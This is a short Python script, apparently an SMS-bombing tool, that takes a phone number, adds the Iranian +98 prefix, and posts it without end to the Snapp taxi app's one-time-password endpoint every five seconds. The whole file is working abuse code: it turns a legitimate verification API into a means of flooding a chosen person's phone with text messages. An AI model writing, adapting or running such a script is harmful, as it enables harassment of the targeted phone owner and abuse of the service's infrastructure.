import requests
import time
phnenum = input("Enter The Phone Number : ")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+phnenum}

while True :
     requests.post(urlsend,data=mydata)
     print("send")
     time.sleep(5)
